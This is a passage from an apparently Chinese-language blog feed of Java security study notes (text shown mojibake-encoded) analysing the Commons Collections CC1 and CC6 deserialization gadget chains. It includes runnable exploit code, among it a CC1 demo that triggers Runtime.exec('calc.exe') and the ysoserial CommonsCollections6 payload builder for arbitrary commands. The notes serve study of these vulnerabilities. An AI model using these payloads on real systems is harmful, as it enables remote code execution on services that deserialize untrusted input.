<p>3.ä¹‹åè°ƒç”¨<code>AnnotationInvocationHandler</code>çš„invokeæ–¹æ³•ï¼Œå…¶ä¸­æ–¹æ³•åä¸º<code>entrySet</code>ï¼Œ<code>this.memberValues=LazyMap</code>ï¼Œä»è€Œè°ƒç”¨LazyMap.get</p>
<p>ï¼ˆä¹‹åçš„å°±å’Œä¹‹å‰çš„å·®ä¸å¤šäº†ï¼Œä¸è¿‡è¿™å…¶ä¸­æœ‰äº›æ¯”è¾ƒå…·ä½“çš„æ­¥éª¤éƒ½æ˜¯æˆ‘è‡ªå·±æ‰“æ–­ç‚¹è°ƒè¯•çŒœæµ‹çš„ï¼Œæ‰€ä»¥å¦‚æœä¸æ­£ç¡®æœŸå¾…å¸ˆå‚…ä»¬çš„æŒ‡æ­£</p>
</blockquote>
<p><strong>Pç¥æ›´æ–°çš„demo:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,Class[].class &#125;, </span><br><span class="line">                               <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class,Object[].class &#125;, </span><br><span class="line">                               <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, newObject[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;,</span><br><span class="line">                               <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span>	ChainedTransformer(transformers);</span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    </span><br><span class="line">    Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br><span class="line">    Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), </span><br><span class="line">                                               <span class="keyword">new</span> Class[] &#123;Map.class&#125;,handler);</span><br><span class="line">    handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize</span></span><br><span class="line">    ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">    oos.writeObject(handler);</span><br><span class="line">    oos.close();</span><br><span class="line">    System.out.println(barr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deserialize</span></span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">    Object o = (Object)ois.readObject();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹æ¯”ä¹‹åå¯ä»¥å‘ç°ysoserialçš„transformerså¤šäº†<code>new ConstantTransformer(1)</code></p>
<blockquote>
<p>ysoserialPOCçš„æœ€åæ‰å°†æ‰§è¡Œå‘½ä»¤çš„Transformeræ•°ç»„è®¾ç½®åˆ°transformerChainä¸­ï¼ŒåŸå› æ˜¯é¿å…æœ¬åœ°ç”Ÿæˆåºåˆ—åŒ–æµçš„ç¨‹åºæ‰§è¡Œåˆ°å‘½ä»¤</p>
</blockquote>
<h4 id="å±€é™"><a href="#å±€é™" class="headerlink" title="å±€é™"></a>å±€é™</h4><p>CC1å¹¶ä¸é€‚ç”¨äºé«˜ç‰ˆæœ¬çš„jdkä¸­ï¼Œåœ¨8u321ä¸­æµ‹è¯•çš„æ—¶å€™ï¼Œcc1å°±ä¸å¯ä»¥äº†ï¼Œæµ…æµ…åˆ†æä¸€ä¸‹åŸå› </p>
<p>æŒ‰ç…§ysoserialçš„Gadgetæ¥ï¼Œæœ€ä¸»è¦éƒ¨åˆ†å°±æ˜¯å‰é¢è°ƒç”¨LazyMap.getçš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€ä¸‹<code>AnnotationInvocationHandler</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°<code>AnnotationInvocationHandler.readObject()</code>çš„ä»£ç å˜äº†ï¼ˆ<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">å¯¹æ¯”</a></p>
<p>è¿™é‡Œåˆ å»äº†<code>s.defaultReadObject()</code>ï¼Œå¢åŠ äº†<code>GetField var2 = var1.readFields()</code>ï¼Œä½¿å¾—åœ¨åé¢è·å–<code>memberValues</code>çš„æ—¶å€™è·å–çš„å€¼å¹¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„<code>LazyMap</code>ï¼Œä»è€Œä¸èƒ½å®ç°invokeçš„è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error:java.lang.Override missing element entrySet</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField var2 = var1.readFields();</span><br><span class="line">    Class var3 = (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map var4 = (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var6 = var5.memberTypes();</span><br><span class="line">    LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        Entry var9 = (Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="keyword">null</span>;</span><br><span class="line">        Class var12 = (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><blockquote>
<p>æ„è¯†æµç¢ç¢å¿µ</p>
</blockquote>
<p>çœŸçš„èŠ±äº†å¾ˆé•¿çš„æ—¶é—´æ¥çœ‹CC1ï¼Œä¸€æ–¹é¢æ˜¯åœ¨å®¡è®¡javaçš„é€‚åº”æœŸï¼Œä¸€æ–¹é¢æ˜¯å¤§éƒ¨åˆ†æ—¶é—´åœ¨ä¸Šè¯¾å’Œè¡¥ä½œä¸šï¼ˆä¸æ•¢åœ¨ä¸Šè¯¾ç©ç”µè„‘çš„å±‘</p>
<p>å®¡è®¡ä¸‹æ¥å› ä¸ºå¯¹javaçš„ä¸ç†Ÿæ‚‰ï¼Œæ‰€ä»¥æœ‰æ—¶å€™ä¸€æ™šä¸Šçš„æ—¶é—´ä¹Ÿæ²¡èƒ½çœ‹æ‡‚å¤šå°‘ï¼Œå¤„äºä¸€ç§äº‘é‡Œé›¾é‡Œçš„çŠ¶æ€ï¼Œä¸è¿‡åˆ°åæ¥å¯¹ç±»è¶Šæ¥è¶Šç†Ÿæ‚‰ä¹‹åå°±é¡ºç•…å¤šäº†ï¼Œè™½ç„¶è¿˜æ˜¯ç•™ä¸‹äº†äº¿ç‚¹ç‚¹é—®é¢˜</p>
<p>è™½ç„¶ç‰¹åœ°å­¦äº†ä¸€ä¸‹åŠ¨æ€ä»£ç†ï¼Œä½†æ˜¯åœ¨èµ°<code>LazyMap</code>é“¾çš„æ—¶å€™ï¼Œè¿˜æ˜¯å› ä¸ºä¸èƒ½ç†è§£è€Œå¡åœ¨æ€ä¹ˆæ‰èƒ½è°ƒç”¨<code>AnnotationInvocationHandler#invoke</code>ä¸Šå¥½ä¸€ä¼š</p>
<p>è™½ç„¶ç®—æ˜¯èµ°äº†ä¸€éï¼Œä½†æ˜¯æ„Ÿè§‰è¿˜æ˜¯å¾—å†è¿‡å‡ éï¼Œä¸è¿‡ä¹Ÿè¦å¼€å§‹çœ‹ä¸‹ä¸€ä¸ªGadgetäº†ï¼ï¼ˆ</p>
<p>æœ€åæ„Ÿæƒ³ï¼ŒPç¥ä¸æ„§æ˜¯ç¥ï¼</p>
<p>å†æ¬¡ç‰¹åˆ«æ„Ÿè°¢Pç¥ã€<a href="https://amiaaaz.github.io/2022/03/23/java-study-notes-03/#lazymap">AmiaaaZ</a>å¸ˆå‚…ï¼ˆè™½ç„¶å¸ˆå‚…å¹¶ä¸è®¤è¯†æˆ‘</p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
        <tag>å­¦ä¹ ä½¿æˆ‘å¿«ä¹å¾—ä¸€</tag>
        <tag>CC1</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaåˆæ­¥å­¦ä¹ â…¢</title>
    <url>/2022/04/13/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A2/</url>
    <content><![CDATA[<blockquote>
<p>CC6ã€CC3ã€RMIç®€å•å…¥é—¨ã€JNDIå…¥é—¨ ï¼ˆä¹‹åå…ˆå»å­¦ä¸€ä¸‹fastjsonååºåˆ—åŒ–</p>
</blockquote>
<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p>ä¸ºäº†è§£å†³CC1åœ¨é«˜ç‰ˆæœ¬jdkä¸­ä¸é€‚ç”¨çš„å±€é™ï¼Œæˆ‘ä»¬æ¥å®¡è®¡ä¸€ä¸‹æ²¡æœ‰ç‰ˆæœ¬é™åˆ¶çš„CC6</p>
<span id="more"></span>

<p>è¿™æ¬¡å°±å…ˆä¸è·Ÿç€Pç¥äº†ï¼</p>
<p>ysoserialçš„Gadget chain</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        Â·Â·Â·</span><br></pre></td></tr></table></figure>

<p>ysoserial poc:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">// å¾—åˆ°è¢«LazyMapè£…é¥°çš„æ¶æ„Map</span></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain); </span><br><span class="line">        <span class="comment">// å°†lazyMapä¼ ç»™TiedMapEntry ä¸ºäº†åç»­è°ƒç”¨LazyMap.get</span></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);<span class="comment">// key = &quot;foo&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªHashMap</span></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>); <span class="comment">// new HashMap(1)</span></span><br><span class="line">        <span class="comment">// å¢åŠ ä¸€ä¸ªkey ä¸”æŒ‡å‘çš„valueä¸ºnull</span></span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>); <span class="comment">// HashMap.put(&quot;foo&quot;,new Object())  key = &quot;foo&quot; &gt;&gt; key.hashCode</span></span><br><span class="line">        </span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>); <span class="comment">// f = (HashMap)map</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map); <span class="comment">// key = map,key.hashCode()</span></span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>); <span class="comment">// f2 = HashMap.table</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123; <span class="comment">// HashMap &quot;foo&quot;</span></span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†TiedMapEntry setåˆ°HashSetä¸­</span></span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry); <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†HashSetå½“ä½œå¯¹è±¡åºåˆ—åŒ– åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨HashSetçš„readObject</span></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections6.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨åˆ°äº†æ–°çš„ç±»<code>TiedMapEntry</code>ï¼Œé‚£å°±å…ˆå»æµ…æµ…äº†è§£ä¸€ä¸‹</p>
<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.map = map; <span class="comment">// åœ¨æ„é€ æ–¹æ³•ä¸­å°†æˆ‘ä»¬çš„LazyMapä¼ è¿›å»</span></span><br><span class="line">    <span class="keyword">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key); <span class="comment">// è°ƒç”¨LazyMap.get()æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue(); <span class="comment">// è°ƒç”¨getValueè§¦å‘LazyMap.get()</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åœ¨<code>TiedMapEntry</code>ä¸Šé¢çš„é€»è¾‘å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯å¤–é¢è°ƒç”¨<code>TiedMapEntry#hashCode</code>=&gt;<code>TiedMapEntry#getValue</code>=&gt;<code>LazyMap#get</code></p>
<h4 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashSet</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    map = <span class="keyword">new</span> HashMap&lt;&gt;(initialCapacity); <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªHashMapç±»</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>; <span class="comment">// HashMap.put &gt;&gt; HashMap.hash &gt;&gt; e.hashCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯ä»¥å‘ç°çš„readObjectä¸­æœ‰<code>(HashMap)map.put(e,PRESENT)</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†<code>TiedMapEntry</code>ä¼ è¿›å»ï¼Œä»è€Œè°ƒç”¨åˆ°äº†<code>TiedMapEntry#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    Â·Â·Â·</span><br><span class="line">    Â·Â·Â·</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Pç¥ã®chain"><a href="#Pç¥ã®chain" class="headerlink" title="Pç¥ã®chain"></a>Pç¥ã®chain</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>å’Œysoserialç›¸æ¯”ï¼ŒPç¥æŠŠ<code>HashSet</code>åˆ æ‰äº†ï¼Œå› ä¸ºåœ¨<code>HashMap</code>çš„<code>readObject</code>ä¸­å°±ä¼šç›´æ¥è°ƒç”¨<code>hash</code>ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æŠŠ<code>TiedMapEntry</code>å½“ä½œkeyä¼ å…¥ä¹‹åä¹Ÿå°±æ˜¯ä¼šç›´æ¥è°ƒç”¨<code>TiedMapEntry.hashCode()</code>ï¼Œç›´æ¥å®Œæˆäº†è¿™æ¡é“¾å­</p>
<p>ç›´æ¥ç¼–å†™è¿™æ¡é“¾å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6ForP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,Object[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> 